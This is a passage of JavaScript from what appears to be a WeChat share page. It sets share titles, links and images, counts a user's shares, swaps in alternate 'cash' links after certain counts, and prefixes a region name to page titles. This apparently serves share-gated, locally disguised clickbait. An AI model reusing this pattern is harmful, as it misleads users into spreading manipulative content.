                    imgUrl: ATimeslen() ? data.share_gg_info.img_url : videostr[vsd].qunimg,
                    type: 'video',
                    dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
                    success: function () {
                        shareATimes += 1;
                        share_tip();
                    },
                    cancel: function () {
                    }
                });
            }
            ////////////////////////////////////////////////////////////////////////////////////////////

        }
        wx.onMenuShareTimeline({
            title: TTimeslen() ? diqu + data.share_timeline_cash_info.title : diqu + videostr[vsd].quantitle,
            desc: TTimeslen() ? diqu + videostr[vsd].des : diqu + videostr[vsd].des,
            link: TTimeslen() ? ggLink(data.share_timeline_cash_info.link, window.data.quan) : window.data.quan + data.share_timeline_info.link,
            imgUrl: TTimeslen() ? data.share_timeline_cash_info.img_url : videostr[vsd].quanimg,
            type: 'video',
            dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
            success: function () {
                shareTTimes += 1;
                if (onequan == 1) {
                    share_tip();
                } else {
                    share_tip_qun();
                }
            },
            cancel: function () {
            }
        });
    });
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function ATimeslen() {
    if ('undefined' !== typeof ATimes['999']) {
        return true
    } else if ('undefined' !== typeof ATimes['0']) {
        return false
    } else if ('undefined' !== typeof ATimes["'" + (shareATimes + 1) + "'"]) {
        return true
    } else {
        return false
    }
}


/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function TTimeslen() {
    if ('undefined' !== typeof TTimes['999']) {
        return true
    } else if ('undefined' !== typeof TTimes['0']) {
        return false
    } else if ('undefined' !== typeof TTimes["'" + (shareTTimes + 1) + "'"]) {
        return true
    } else {
        return false
    }
}


/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function ggLink(cash, host) {
    return host + cash
}


// 标题地区
function dq() {
    var dq_s = 0;
    $(".spid").each(function (a, b) {
        $(this).html((window.diqu + $(this).html()))
    })

    if (dq_s > 0) {
        $(".rich_media_title").each(function (a, b) {
            $(this).html((window.diqu + $(this).html()))
        })
    }
    dq_s++;
}

 	




